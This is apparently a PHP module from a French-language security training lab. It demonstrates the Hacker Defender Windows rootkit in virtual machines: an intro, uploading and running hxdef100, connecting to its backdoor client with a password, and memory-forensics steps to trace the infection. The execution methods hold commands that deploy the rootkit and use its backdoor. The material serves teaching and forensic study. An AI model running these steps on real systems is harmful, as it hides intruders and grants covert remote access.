<?php 




class rootkit4win extends trojan4win{

    // https://github.com/bytecode77/r77-rootkit

    public function __construct($target_vmx_name,$target_ip,$target_port,$attacker_ip,$attacker_port,$file_path_output,$snapshot) {
        parent::__construct($target_vmx_name,$target_ip,$target_port,$attacker_ip,$attacker_port,$file_path_output,$snapshot);
    }
    
    
   
    
    
    public function rootkit4win_user_hackerDefender() {
        $this->titre(__FUNCTION__);
        /*
        $this->rootkit4win_user_hackerDefender_intro();$this->pause();
        $this->rootkit4win_user_hackerDefender_download();$this->pause();
        $this->rootkit4win_user_hackerDefender_install();$this->pause();
        $this->rootkit4win_user_hackerDefender_execution();$this->pause();
        */
        $this->rootkit4win_user_hackerDefender_forensics();$this->pause();
        $this->rootkit4win_user_hackerDefender_conclusion();$this->pause();
    }
    public function rootkit4win_user_hackerDefender_execution(){
        $this->ssTitre(__FUNCTION__);
        $this->note("une fois que vous aurez tapper la commande le dossier va se caché cependant on peut tout voir coté attaquant");
        $target_xp3 = new VM($this->target_vmx_name); // xp3
        $this->article("new setting in hxdef100.ini","cd $this->vm_tmp_win & hxdef100.exe -:refresh");
        $attacker = new VM("win7x86");
        $attacker->vm2upload("$this->dir_tools/Malware/hxdef100.zip", "$this->vm_tmp_win\\hxdef100.zip");
        $this->article($this->attacker_ip,"bdcli100.exe $this->target_ip 80 h4ck3r-pass");
        $this->article($this->attacker_ip,"echo 'hidden data' > h4ck3r_data.txt && dir h4ck3r* ");
        $this->article("$this->target_ip:uninstall","cd $this->vm_tmp_win & hxdef100.exe -:uninstall");
        
    }
    public function rootkit4win_user_hackerDefender_forensics(){
        $this->ssTitre(__FUNCTION__);
        // cat hacker_defender.rst | egrep -i "(h4ck3r|hxdef|vol.py|10.100.10|sws|692|1432|1620|3132|3136|3488|3492|3556|3560|3576|3580|3584|3588)"
        $pid = "692,1432,1620,3132,3136,3488,3492,3556,3560,3576,3580,3584,3588";
        // = "--pid=$pid";

        $hxdef = new bin4win($this->file_path, "WinXPSP3x86");
        $hxdef->for4win_all(""); $this->pause();
        $this->ssTitre("Find Tracks into Hacker Defender vmem");
        
        
        $hxdef->for4win_Malware_persistence_mz();$this->pause();
        $hxdef->for4win_Networking_netstat();$this->pause();
        $hxdef->for4win_Information_cmd_history();$this->pause();
        $hxdef->for4win_Information_env_vars();$this->pause();
        $hxdef->for4win_Information_deskscan();$this->pause();
        $hxdef->for4win_Information_dlllist();$this->pause();
        $hxdef->for4win_Information_drivermodule();$this->pause();
        $hxdef->for4win_Information_file_filescan();$this->pause();
        $hxdef->for4win_Information_getservicesids();$this->pause();
        $hxdef->for4win_Information_mftparser();$this->pause();
        $hxdef->for4win_Dump_file_name("h4ck3r_cmd.exe", "");$this->pause();
        $hxdef->for4win_Dump_file_name("h4ck3r.exe", "");$this->pause();
        $hxdef->for4win_Dump_file_name("sws.exe", "");$this->pause();
        
    }
    
    
    public function rootkit4win_user_hackerDefender_conclusion(){
        $this->ssTitre(__FUNCTION__);
    }
    
    public function rootkit4win_user_hackerDefender_intro(){
        $this->ssTitre(__FUNCTION__);
        $this->article("Hacker Defender","un Rootkit personnalisable en mode utilisateur qui modifie plusieurs fonctions API native Windows
et pour lui permettre de cacher des informations à partir d'autres applications.
Hacker Defender implémente également une porte dérobée et le port de redirection qui opère à
travers les ports TCP ouverts par les services existants. Hacker Defender est l'un des Rootkits les
plus déployées à l'état sauvage. il est accessible au public à la fois sous forme de code source et
binaire.");
    }
    
    public function rootkit4win_user_hackerDefender_download(){
        $this->ssTitre(__FUNCTION__);
        $this->net("https://www.f-secure.com/v-descs/rootkit_w32_hacdef.shtml");
        $this->net("http://www.aldeid.com/wiki/Hacker-Defender-hxdef");
    }
    
    public function rootkit4win_user_hackerDefender_install(){
        $this->ssTitre(__FUNCTION__);
        $this->cmd("$this->target_ip","install Simple Web Server - SWS");
        $sdbx = new VM($this->target_vmx_name); // xp3
        $liste = $sdbx->vm2process_list();
        $this->requette("cat $liste | grep sws.exe ");
        $sdbx->vm2upload("$this->dir_install/Win/for/sws-2.2-rc2-i686.exe", "$this->vm_tmp_win\\sws-2.2-rc2-i686.exe");
        $sdbx->vm2upload("$this->dir_tools/Malware/hxdef100.zip", "$this->vm_tmp_win\\hxdef100.zip");
    }
    
    
    
    
}
?>